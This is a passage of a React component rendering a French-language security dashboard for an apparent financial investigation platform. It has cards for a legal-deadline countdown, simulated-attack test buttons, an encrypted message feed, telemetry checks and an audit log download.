                {onSimulateRepetitiveAttack && (
                  <button
                    onClick={() => {
                      cyberAudio.playTacticalClick();
                      onSimulateRepetitiveAttack('RATE_LIMIT');
                    }}
                    className="px-2 py-1.5 bg-amber-950/70 hover:bg-amber-900/80 text-amber-300 border border-amber-700/80 rounded-xl text-xs font-mono font-bold flex items-center space-x-1 transition-all shadow-[0_0_10px_rgba(245,158,11,0.2)] cursor-pointer"
                    title="Simuler 3 rejets consécutifs pour tester le Background Worker et la génération automatique du ticket P1"
                  >
                    <AlertOctagon className="w-3 h-3 text-amber-400" />
                    <span>Test Sentinelle P1</span>
                  </button>
                )}
              </div>
              <button
                onClick={() => {
                  cyberAudio.playTacticalClick();
                  onOpenOwaspModal();
                }}
                className="text-xs text-cyan-400 hover:underline font-mono flex items-center space-x-1"
              >
                <span>Détails WAF</span>
                <ChevronRight className="w-3 h-3" />
              </button>
            </div>
          </motion.div>
        )}

        {/* CARTE 3 : Astreinte Légale 48h & Décret d'Opposition (col 12 -> 4) */}
        {(dashboardTab === 'all' || dashboardTab === 'itsm' || dashboardTab === 'intelligence') && (
          <motion.div
            variants={cardVariants}
            whileHover={{ y: -2, transition: { duration: 0.15 } }}
            className="col-span-12 lg:col-span-4 backdrop-blur-2xl bg-slate-900/40 border border-slate-700/50 hover:border-red-500/50 p-4 rounded-2xl shadow-xl space-y-3 relative overflow-hidden transition-all group"
          >
            <div className="absolute -top-12 -right-12 w-32 h-32 bg-red-500/10 rounded-full blur-2xl pointer-events-none group-hover:bg-red-500/20 transition-all" />

            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2.5">
                <div className="p-2.5 rounded-xl bg-red-950/80 border border-red-800/80 text-red-400 shadow-[0_0_10px_rgba(239,68,68,0.3)]">
                  <AlertOctagon className="w-5 h-5 animate-bounce" />
                </div>
                <div>
                  <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                    Opposition 48h (Art. 29)
                  </h3>
                  <span className="text-[10px] text-slate-400 font-mono">Délai Légal Conservatoire</span>
                </div>
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-950 text-red-300 border border-red-800 font-bold">
                CRITIQUE P1
              </span>
            </div>

            <div className="bg-slate-950/70 p-3 rounded-xl border border-slate-800 flex items-center justify-between">
              <div>
                <div className="text-[10px] text-slate-500 font-mono">SLA MTTR Restant P1</div>
                <div className="text-xl font-bold font-mono text-red-400 tabular-nums">
                  {p1Sla ? p1Sla.formatted : '01:54:10'}
                </div>
              </div>
              <div className="text-right">
                <div className="text-[10px] text-slate-500 font-mono">Avoirs Sous Séquestre</div>
                <div className="text-xs font-bold text-amber-300 font-mono">1 450 000 000 FCFA</div>
              </div>
            </div>

            <div className="flex items-center justify-between pt-1">
              <span className="text-[11px] text-slate-400 font-mono">Escalade DG : Active</span>
              <button
                onClick={handleEmergencyWithAudio}
                className="px-2.5 py-1 bg-red-950 hover:bg-red-900 text-red-200 border border-red-800 rounded-lg text-xs font-mono font-bold"
              >
                Déclencher Cellule Crise
              </button>
            </div>
          </motion.div>
        )}

        {/* CARTE HEATMAP DE SÉCURITÉ : Visualisation temps réel des bloquages Rate Limit et accès non autorisés */}
        {(dashboardTab === 'all' || dashboardTab === 'cyber') && (
          <motion.div variants={cardVariants} className="col-span-12">
            <SecurityHeatmap
              auditLogs={auditLogs}
              activeAttacksBlocked={activeAttacksBlocked}
              onSimulateAttack={handleSimulateAttack}
              onSimulateRateLimit={handleTestRateLimit}
            />
          </motion.div>
        )}

        {/* CARTE ANALYSEUR DE MENACES IA : Corrélation WORM & Détection Pivot Latéral */}
        {(dashboardTab === 'all' || dashboardTab === 'cyber') && (
          <motion.div variants={cardVariants} className="col-span-12">
            <SecurityThreatAnalyzer
              auditLogs={auditLogs}
              onTriggerMitigation={() => {
                cyberAudio.playCryptoBip();
                onRunDiagnostic('kedb');
              }}
              onSelectCorrelatedLog={() => {
                cyberAudio.playTacticalClick();
                onSwitchToSplitView();
              }}
            />
          </motion.div>
        )}

        {/* CARTE 4 : Flux E2EE Double Ratchet Scellé (col 12 -> 7) */}
        {(dashboardTab === 'all' || dashboardTab === 'intelligence') && (
          <motion.div
            variants={cardVariants}
            className="col-span-12 lg:col-span-7 backdrop-blur-2xl bg-slate-900/40 border border-slate-700/50 p-4 rounded-2xl shadow-xl space-y-3"
          >
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <div className="flex items-center space-x-2">
                <Lock className="w-4 h-4 text-amber-400" />
                <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                  Flux Chiffré en Direct : #{activeChannel.code}
                </h3>
              </div>
              <div className="flex items-center space-x-2">
                <span
                  id="ws-bento-sync-badge"
                  className="text-[10px] font-mono text-cyan-300 bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800 flex items-center space-x-1"
                  title={`Liaison WebSocket DC Nkok: ${wsStatus} (${wsLatencyMs}ms, ${onlineAgentsCount} connectés)`}
                >
                  <span className={`w-1.5 h-1.5 rounded-full ${wsStatus === 'connected' ? 'bg-cyan-400 animate-pulse' : 'bg-amber-400'}`} />
                  <span>WS SYNC ({onlineAgentsCount} AGT)</span>
                </span>
                <span className="text-[10px] font-mono text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800">
                  Zero-Knowledge Actif
                </span>
              </div>
            </div>

            {isZeroKnowledgeBlocked && (
              <div className="p-2.5 bg-amber-950/60 border border-amber-800 rounded-lg text-xs font-mono text-amber-200">
                Rupture d'accès administrateur : Vos privilèges d'infrastructure (Niv 3) masquent le texte en clair des enquêtes.
              </div>
            )}

            {/* 3 derniers messages */}
            <div className="space-y-2 max-h-48 overflow-y-auto font-mono text-xs">
              {messages.slice(-3).map((m) => (
                <div key={m.id} className="p-2.5 bg-slate-950/80 rounded-xl border border-slate-800/80 hover:border-slate-700 transition-colors">
                  <div className="flex justify-between text-[10px] text-slate-500 mb-1">
                    <span className="text-slate-300 font-bold">{m.auteur}</span>
                    <span>{m.timestampRFC3161}</span>
                  </div>
                  <div className="text-slate-200 font-sans text-xs">
                    {isZeroKnowledgeBlocked ? '[CONTENU SCELLÉ - ZERO-KNOWLEDGE]' : m.texteClair}
                  </div>
                </div>
              ))}
            </div>

            <div className="flex items-center space-x-2 pt-1">
              <input
                type="text"
                value={bentoInput}
                onChange={(e) => setBentoInput(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleQuickSend()}
                disabled={isZeroKnowledgeBlocked}
                placeholder={isZeroKnowledgeBlocked ? "Lecture seule pour admin SSI..." : "Saisir un message chiffré AES-GCM 256 bits..."}
                className="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-3 py-1.5 text-xs text-white focus:outline-none focus:border-cyan-400 font-mono"
              />
              <button
                onClick={handleQuickSend}
                disabled={!bentoInput.trim() || isZeroKnowledgeBlocked}
                className="px-4 py-1.5 bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-white rounded-xl text-xs font-bold font-mono flex items-center space-x-1 shadow-[0_0_10px_rgba(6,182,212,0.3)] transition-all"
              >
                <Send className="w-3.5 h-3.5" />
                <span>Chiffrer</span>
              </button>
            </div>
          </motion.div>
        )}

        {/* CARTE 5 : Agent Diagnostic SSI & Télémétrie Nkok (col 12 -> 5) */}
        {(dashboardTab === 'all' || dashboardTab === 'itsm' || dashboardTab === 'cyber') && (
          <motion.div
            variants={cardVariants}
            className="col-span-12 lg:col-span-5 backdrop-blur-2xl bg-slate-900/40 border border-slate-700/50 p-4 rounded-2xl shadow-xl space-y-3"
          >
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <div className="flex items-center space-x-2">
                <Bot className="w-4 h-4 text-blue-400" />
                <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                  Sondes Télémétriques SSI
                </h3>
              </div>
              <span className="text-[10px] font-mono text-purple-400">KEDB Ready</span>
            </div>

            <p className="text-[11px] text-slate-400">
              Contrôles d'intégrité automatisés vers l'infrastructure Tier III de Nkok :
            </p>

            <div className="grid grid-cols-2 gap-2 text-xs font-mono">
              <button
                onClick={() => handleDiagnosticWithAudio('nkok')}
                className="p-2.5 bg-slate-950/80 hover:bg-slate-800 text-slate-200 border border-slate-800 hover:border-cyan-500 rounded-xl text-left transition-colors"
              >
                <div className="font-bold text-cyan-400 text-[11px]">1. Fibre Nkok</div>
                <div className="text-[10px] text-slate-400">Latence {liveLatency}ms</div>
              </button>
              <button
                onClick={() => handleDiagnosticWithAudio('keycloak')}
                className="p-2.5 bg-slate-950/80 hover:bg-slate-800 text-slate-200 border border-slate-800 hover:border-purple-500 rounded-xl text-left transition-colors"
              >
                <div className="font-bold text-purple-400 text-[11px]">2. IAM Keycloak</div>
                <div className="text-[10px] text-slate-400">Jetons YubiKey</div>
              </button>
              <button
                onClick={() => handleDiagnosticWithAudio('minio')}
                className="p-2.5 bg-slate-950/80 hover:bg-slate-800 text-slate-200 border border-slate-800 hover:border-emerald-500 rounded-xl text-left transition-colors"
              >
                <div className="font-bold text-emerald-400 text-[11px]">3. MinIO S3</div>
                <div className="text-[10px] text-slate-400">Scellés chiffrés</div>
              </button>
              <button
                onClick={() => handleDiagnosticWithAudio('kedb')}
                className="p-2.5 bg-slate-950/80 hover:bg-slate-800 text-slate-200 border border-slate-800 hover:border-amber-500 rounded-xl text-left transition-colors"
              >
                <div className="font-bold text-amber-400 text-[11px]">4. Base KEDB</div>
                <div className="text-[10px] text-slate-400">Contournements</div>
              </button>
            </div>
          </motion.div>
        )}

        {/* CARTE 6 : Registre d'Audit WORM Scellé Merkle (col 12 -> 4) */}
        {(dashboardTab === 'all' || dashboardTab === 'cyber') && (
          <motion.div
            variants={cardVariants}
            className="col-span-12 lg:col-span-4 backdrop-blur-2xl bg-slate-900/40 border border-slate-700/50 p-4 rounded-2xl shadow-xl space-y-2"
          >
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <ScrollText className="w-4 h-4 text-emerald-400" />
                <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                  Audit WORM Merkle
                </h3>
              </div>
              <span className="text-[10px] font-mono text-emerald-400 font-bold">RFC 3161</span>
            </div>

            <div className="bg-slate-950/80 p-3 rounded-xl border border-slate-800 font-mono text-xs space-y-1">
              <div className="flex justify-between text-slate-400 text-[10px]">
                <span>Feuilles chaînées :</span>
                <span className="font-bold text-emerald-400">{auditLogs.length} blocs</span>
              </div>
              <div className="text-[10px] text-slate-500 truncate">
                Dernier hash : {auditLogs[0]?.hachageActuel.substring(0, 24)}...
              </div>
            </div>

            {onDownloadWormAudit && (
              <button
                onClick={() => {
                  cyberAudio.playTacticalClick();
                  onDownloadWormAudit();
                }}
                className="w-full py-2 px-3 bg-emerald-950/80 hover:bg-emerald-900/90 text-emerald-300 border border-emerald-700/80 rounded-xl text-xs font-mono font-bold flex items-center justify-center space-x-2 shadow-[0_0_15px_rgba(16,185,129,0.25)] transition-all group cursor-pointer"
                title="Télécharger l'audit WORM (CSV signé par biométrie WebAuthn)"
              >
                <Download className="w-3.5 h-3.5 text-emerald-400 group-hover:translate-y-0.5 transition-transform" />
                <Fingerprint className="w-3.5 h-3.5 text-emerald-400" />
                <span>Download WORM Audit (CSV)</span>
              </button>
            )}
          </motion.div>
        )}

        {/* CARTE 7 : Atelier Méga-Prompt & Forge Souveraine (col 12 -> 8) */}
        <motion.div
          variants={cardVariants}
          className="col-span-12 lg:col-span-8 backdrop-blur-2xl bg-gradient-to-br from-slate-900/60 via-slate-900/40 to-purple-950/20 border border-purple-500/30 p-4 rounded-2xl shadow-xl space-y-3"
        >
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
            <div className="flex items-center space-x-2">
              <Sparkles className="w-4 h-4 text-purple-400" />
              <h3 className="font-bold text-xs text-white uppercase tracking-wider">
                Atelier Méga-Prompt & Forge Souveraine
              </h3>
            </div>
            <span className="text-[10px] font-mono text-purple-300 bg-purple-950/60 px-2 py-0.5 rounded border border-purple-800 font-semibold">
              Générateur d'Architecture Awwwards
            </span>
          </div>

          <div className="space-y-1.5 text-xs font-mono">
            <label className="text-slate-400 text-[11px]">Projet Actif [VOTRE IDÉE D'APPLICATION ICI] :</label>
            <div className="flex gap-2">
              <input
                type="text"
                value={customIdeaInput}
                onChange={(e) => setCustomIdeaInput(e.target.value)}
                className="flex-1 bg-slate-950 border border-purple-700/60 rounded-xl px-3 py-1.5 text-xs text-purple-200 focus:outline-none focus:border-purple-400 font-mono"
              />
              <button
                onClick={() => {
                  cyberAudio.playCryptoBip();
                  setForgeExported(true);
                  if (onOpenMegaPrompt) {
                    onOpenMegaPrompt(customIdeaInput);
                  }
                  setTimeout(() => setForgeExported(false), 2500);
                }}
                className="px-4 py-1.5 bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white rounded-xl text-xs font-bold font-mono transition-all shadow-[0_0_15px_rgba(147,51,234,0.4)] shrink-0 flex items-center space-x-1.5"
              >
                <Sparkles className="w-3.5 h-3.5" />
                <span>Ouvrir Studio Awwwards</span>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap gap-1.5 text-[10px] font-mono text-slate-400">
            <span>Idées pré-configurées :</span>
            <button
              onClick={() => {
                cyberAudio.playTacticalClick();
                setCustomIdeaInput("Core Banking Souverain CEMAC (Chiffrement E2EE & ISO 20022)");
              }}
              className="px-2.5 py-0.5 bg-slate-800/80 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors"
            >
              1. Core Banking CEMAC
            </button>
            <button
              onClick={() => {
                cyberAudio.playTacticalClick();
                setCustomIdeaInput("Coffre-Fort Numérique & Signature Électronique Régalien");
              }}
              className="px-2.5 py-0.5 bg-slate-800/80 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors"
            >
              2. Coffre-Fort d'État
            </button>
            <button
              onClick={() => {
                cyberAudio.playTacticalClick();
                setCustomIdeaInput("Plateforme d'Investigation Financière ANIF Gabon (E2EE Zero-Knowledge + ITSM)");
              }}
              className="px-2.5 py-0.5 bg-slate-800/80 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors"
            >
              3. ANIF Gabon (Défaut)
            </button>
          </div>
        </motion.div>
      </motion.div>
    </div>
  );
};
